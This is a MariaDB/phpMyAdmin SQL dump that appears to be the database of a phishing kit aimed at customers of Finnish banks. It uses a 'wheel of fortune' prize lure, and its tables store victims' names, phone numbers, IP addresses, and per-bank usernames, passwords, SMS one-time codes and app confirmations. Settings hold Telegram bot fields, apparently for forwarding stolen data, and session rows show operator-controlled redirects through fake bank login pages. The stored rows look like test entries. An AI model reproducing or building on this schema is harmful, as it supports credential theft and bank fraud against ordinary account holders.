-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Hazırlanma Vaxtı: 27 Yan, 2026 saat 16:29
-- Server versiyası: 10.6.20-MariaDB-cll-lve
-- PHP Versiyası: 7.4.27

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Verilənlər Bazası: `demowa_teze`
--

-- --------------------------------------------------------

--
-- Cədvəl üçün cədvəl strukturu `admin_users`
--

CREATE TABLE `admin_users` (
  `id` int(11) NOT NULL,
  `username` varchar(100) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email` varchar(255) DEFAULT NULL,
  `last_login` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Sxemi çıxarılan cedvel `admin_users`
--

INSERT INTO `admin_users` (`id`, `username`, `password`, `email`, `last_login`, `created_at`) VALUES
(1, 'admin', '$2y$12$.vjbwgzuKXA40NbmD7YFqe1USrSCFDy3WKGuNd1pTfB.LMSp889Zi', 'admin@example.com', '2026-01-27 11:13:37', '2026-01-26 19:58:27');

-- --------------------------------------------------------

--
-- Cədvəl üçün cədvəl strukturu `banks`
--

CREATE TABLE `banks` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT 1,
  `display_order` int(11) DEFAULT 0,
  `color` varchar(7) DEFAULT '#FF6B6B',
  `wheel_text` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Sxemi çıxarılan cedvel `banks`
--

INSERT INTO `banks` (`id`, `name`, `logo`, `is_active`, `display_order`, `color`, `wheel_text`, `created_at`, `updated_at`) VALUES
(1, 'Nordea', 'nordea.png', 1, 1, '#FF6B6B', '1', '2026-01-26 19:58:27', '2026-01-26 19:58:27'),
(2, 'OP', 'op.png', 1, 2, '#4ECDC4', '2', '2026-01-26 19:58:27', '2026-01-26 19:58:27'),
(3, 'Danske Bank', 'danske.png', 1, 3, '#45B7D1', '3', '2026-01-26 19:58:27', '2026-01-26 19:58:27'),
(4, 'Aktia', 'aktia.png', 1, 4, '#FFA07A', '4', '2026-01-26 19:58:27', '2026-01-26 19:58:27'),
(5, 'S-Pankki', 'spankki.png', 1, 5, '#98D8C8', '5', '2026-01-26 19:58:27', '2026-01-26 19:58:27'),
(6, 'Ålandsbanken', 'alandsbanken.png', 1, 6, '#F7DC6F', '6', '2026-01-26 19:58:27', '2026-01-26 19:58:27'),
(7, 'POP Pankki', 'poppankki.png', 1, 7, '#FFD700', '7', '2026-01-26 23:18:25', '2026-01-26 23:18:25'),
(8, 'Oma Säästöpankki', 'omasp.png', 1, 8, '#000000', '8', '2026-01-26 23:32:31', '2026-01-26 23:32:31'),
(9, 'Säästöpankki', 'saastopankki.png', 1, 9, '#0996d4', '9', '2026-01-26 23:53:59', '2026-01-26 23:53:59'),
(10, 'Handelsbanken', 'handelsbanken.png', 1, 10, '#005fa5', '10', '2026-01-27 00:18:29', '2026-01-27 00:18:29');

-- --------------------------------------------------------

--
-- Cədvəl üçün cədvəl strukturu `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `setting_key` varchar(100) NOT NULL,
  `setting_value` text DEFAULT NULL,
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Sxemi çıxarılan cedvel `settings`
--

INSERT INTO `settings` (`id`, `setting_key`, `setting_value`, `updated_at`) VALUES
(1, 'telegram_bot_token', '', '2026-01-26 19:58:27'),
(2, 'telegram_chat_id', '', '2026-01-26 19:58:27'),
(3, 'telegram_enabled', '1', '2026-01-26 19:58:27'),
(4, 'wheel_title', 'Onnea!', '2026-01-26 19:58:27'),
(5, 'wheel_subtitle', 'Pyöräytä pyörää ja voita', '2026-01-26 19:58:27'),
(6, 'wheel_instruction', 'Klikkaa pyörää tai keskimmäistä nappia aloittaaksesi', '2026-01-26 19:58:27'),
(7, 'wheel_spinning', 'Pyörä pyörii...', '2026-01-26 19:58:27'),
(8, 'wheel_button_text', 'SPIN', '2026-01-26 19:58:27');

-- --------------------------------------------------------

--
-- Cədvəl üçün cədvəl strukturu `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `full_name` varchar(255) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `ip_address` varchar(45) NOT NULL,
  `selected_bank_id` int(11) DEFAULT NULL,
  `nordea_username` varchar(255) DEFAULT NULL,
  `nordea_password` varchar(255) DEFAULT NULL,
  `nordea_sms_code` varchar(50) DEFAULT NULL,
  `nordea_app_confirmed` tinyint(1) DEFAULT 0,
  `alandsbanken_username` varchar(255) DEFAULT NULL,
  `alandsbanken_password` varchar(255) DEFAULT NULL,
  `alandsbanken_sms_code` varchar(255) DEFAULT NULL,
  `alandsbanken_app_confirmed` tinyint(1) DEFAULT 0,
  `danske_username` varchar(255) DEFAULT NULL,
  `danske_password` varchar(255) DEFAULT NULL,
  `danske_sms_code` varchar(50) DEFAULT NULL,
  `danske_app_confirmed` tinyint(1) DEFAULT 0,
  `spankki_username` varchar(255) DEFAULT NULL,
  `spankki_password` varchar(255) DEFAULT NULL,
  `spankki_sms_code` varchar(50) DEFAULT NULL,
  `spankki_app_confirmed` tinyint(1) DEFAULT 0,
  `aktia_username` varchar(255) DEFAULT NULL,
  `aktia_sms_code` varchar(50) DEFAULT NULL,
  `aktia_app_confirmed` tinyint(1) DEFAULT 0,
  `aktia_login_method` varchar(50) DEFAULT NULL,
  `op_username` varchar(255) DEFAULT NULL,
  `op_password` varchar(255) DEFAULT NULL,
  `op_sms_code` varchar(50) DEFAULT NULL,
  `op_app_confirmed` tinyint(1) DEFAULT 0,
  `poppankki_username` varchar(255) DEFAULT NULL,
  `poppankki_sms_code` varchar(10) DEFAULT NULL,
  `poppankki_app_confirmed` tinyint(1) DEFAULT 0,
  `omasp_username` varchar(255) DEFAULT NULL,
  `omasp_sms_code` varchar(10) DEFAULT NULL,
  `omasp_app_confirmed` tinyint(1) DEFAULT 0,
  `saastopankki_username` varchar(255) DEFAULT NULL,
  `saastopankki_sms_code` varchar(10) DEFAULT NULL,
  `saastopankki_app_confirmed` tinyint(1) DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `handelsbanken_username` varchar(255) DEFAULT NULL,
  `handelsbanken_password` varchar(255) DEFAULT NULL,
  `handelsbanken_sms_code` varchar(10) DEFAULT NULL,
  `handelsbanken_app_confirmed` tinyint(1) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Sxemi çıxarılan cedvel `users`
--

INSERT INTO `users` (`id`, `full_name`, `phone`, `ip_address`, `selected_bank_id`, `nordea_username`, `nordea_password`, `nordea_sms_code`, `nordea_app_confirmed`, `alandsbanken_username`, `alandsbanken_password`, `alandsbanken_sms_code`, `alandsbanken_app_confirmed`, `danske_username`, `danske_password`, `danske_sms_code`, `danske_app_confirmed`, `spankki_username`, `spankki_password`, `spankki_sms_code`, `spankki_app_confirmed`, `aktia_username`, `aktia_sms_code`, `aktia_app_confirmed`, `aktia_login_method`, `op_username`, `op_password`, `op_sms_code`, `op_app_confirmed`, `poppankki_username`, `poppankki_sms_code`, `poppankki_app_confirmed`, `omasp_username`, `omasp_sms_code`, `omasp_app_confirmed`, `saastopankki_username`, `saastopankki_sms_code`, `saastopankki_app_confirmed`, `created_at`, `updated_at`, `handelsbanken_username`, `handelsbanken_password`, `handelsbanken_sms_code`, `handelsbanken_app_confirmed`) VALUES
(1, '87687687 7687687687', '768768768768', '185.130.90.5', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-26 20:02:12', '2026-01-26 20:02:12', NULL, NULL, NULL, 0),
(2, '65765756 7567757', '+3586765766', '217.64.30.6', 1, '898797898', '', NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-26 20:16:55', '2026-01-26 21:22:00', NULL, NULL, NULL, 0),
(3, 'rtghtrhrth ergbrgrtgrt', '+358564456456456456', '185.130.90.5', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-26 20:55:08', '2026-01-26 20:55:08', NULL, NULL, NULL, 0),
(4, '3242343 234234234', '+358234324334', '217.64.30.6', 1, '567567567', '', NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-26 21:32:37', '2026-01-26 21:45:25', NULL, NULL, NULL, 0),
(5, '657657657 657567567657', '+358657567657', '84.17.47.123', 1, '675765767', '', NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-26 21:50:00', '2026-01-26 22:29:21', NULL, NULL, NULL, 0),
(6, 'adas test', '+3583423432423', '217.64.30.6', 7, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, '56756756', '657567', 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-26 23:18:36', '2026-01-26 23:20:20', NULL, NULL, NULL, 0),
(7, 'at at', '+3583243243244', '217.64.30.6', 7, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, '65765757', '756765', 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-26 23:21:38', '2026-01-26 23:22:12', NULL, NULL, NULL, 0),
(8, 'adas adas', '+358342342324', '217.64.30.6', 8, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, '53454354', NULL, 0, NULL, NULL, 0, '2026-01-26 23:42:53', '2026-01-26 23:43:13', NULL, NULL, NULL, 0),
(9, 'ad as', '+3582134234234', '217.64.30.6', 9, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '4354353', '567657', 0, '2026-01-27 00:03:03', '2026-01-27 00:04:23', NULL, NULL, NULL, 0),
(10, 'dfsdsf dsfdsfdsf', '+35842314124124', '2a00:1d34:f807:e000:9949:b94b:7907:97e6', 1, '6546456456', '', NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-27 11:01:43', '2026-01-27 11:02:19', NULL, NULL, NULL, 0),
(11, 'adas adas', '+3584324324324', '217.64.30.6', 10, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, '76877876', NULL, 0, '6575675', '768678', 1, '2026-01-27 11:13:31', '2026-01-27 11:33:48', '567657', NULL, NULL, 0),
(12, 'gfhgffd hjgvhjgjfc', '+358786876987678', '2a00:1d34:f807:e000:9949:b94b:7907:97e6', 7, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, '32452342', NULL, 0, NULL, NULL, 0, '2026-01-27 11:32:16', '2026-01-27 11:36:36', NULL, NULL, NULL, 0),
(13, 'zhgiuzgiuzf uhgkjhfizuf', '+35887698769876987', '2a00:1d34:f807:e000:9949:b94b:7907:97e6', 5, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-27 11:40:04', '2026-01-27 11:41:59', NULL, NULL, NULL, 0),
(14, 'asd asd', '+35834422343423', '84.17.47.125', 4, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, '567567', NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-27 11:42:12', '2026-01-27 12:07:39', NULL, NULL, NULL, 0),
(15, 'asdasdas asdsad', '+358342343', '217.64.30.6', 10, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, 0, '56756756', NULL, 0, NULL, NULL, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, '2026-01-27 12:13:55', '2026-01-27 12:28:28', '6575675', NULL, NULL, 0);

-- --------------------------------------------------------

--
-- Cədvəl üçün cədvəl strukturu `user_sessions`
--

CREATE TABLE `user_sessions` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `current_page` varchar(255) NOT NULL,
  `page_title` varchar(255) DEFAULT NULL,
  `redirect_to` varchar(255) DEFAULT NULL,
  `redirect_at` timestamp NULL DEFAULT NULL,
  `last_activity` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Sxemi çıxarılan cedvel `user_sessions`
--

INSERT INTO `user_sessions` (`id`, `user_id`, `current_page`, `page_title`, `redirect_to`, `redirect_at`, `last_activity`, `created_at`) VALUES
(10, 10, '/', 'Tervetuloa - FinTech', NULL, NULL, '2026-01-27 11:32:20', '2026-01-27 11:01:45'),
(11, 11, '/', 'Tervetuloa - FinTech', NULL, NULL, '2026-01-27 11:42:12', '2026-01-27 11:13:32'),
(12, 12, '/', 'Tervetuloa - FinTech', NULL, NULL, '2026-01-27 11:40:05', '2026-01-27 11:32:22'),
(13, 13, '/user/13/bank/5', 'Tunnistautuminen', NULL, NULL, '2026-01-27 11:49:34', '2026-01-27 11:40:05'),
(14, 14, '/user/14/bank/4', 'Kirjaudu palveluun', NULL, NULL, '2026-01-27 12:28:40', '2026-01-27 11:42:13'),
(15, 15, '/user/15/bank/handelsbanken2', 'Vänta - Handelsbanken', NULL, NULL, '2026-01-27 12:28:28', '2026-01-27 12:13:56');

--
-- Indexes for dumped tables
--

--
-- Cədvəl üçün indekslər `admin_users`
--
ALTER TABLE `admin_users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- Cədvəl üçün indekslər `banks`
--
ALTER TABLE `banks`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_active` (`is_active`),
  ADD KEY `idx_order` (`display_order`);

--
-- Cədvəl üçün indekslər `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `setting_key` (`setting_key`);

--
-- Cədvəl üçün indekslər `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_phone` (`phone`),
  ADD KEY `idx_created_at` (`created_at`),
  ADD KEY `selected_bank_id` (`selected_bank_id`);

--
-- Cədvəl üçün indekslər `user_sessions`
--
ALTER TABLE `user_sessions`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_user_id` (`user_id`),
  ADD KEY `idx_last_activity` (`last_activity`),
  ADD KEY `idx_redirect` (`redirect_to`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- Cədvəl üçün AUTO_INCREMENT `admin_users`
--
ALTER TABLE `admin_users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Cədvəl üçün AUTO_INCREMENT `banks`
--
ALTER TABLE `banks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- Cədvəl üçün AUTO_INCREMENT `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- Cədvəl üçün AUTO_INCREMENT `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- Cədvəl üçün AUTO_INCREMENT `user_sessions`
--
ALTER TABLE `user_sessions`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `users`
--
ALTER TABLE `users`
  ADD CONSTRAINT `users_ibfk_1` FOREIGN KEY (`selected_bank_id`) REFERENCES `banks` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `user_sessions`
--
ALTER TABLE `user_sessions`
  ADD CONSTRAINT `user_sessions_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;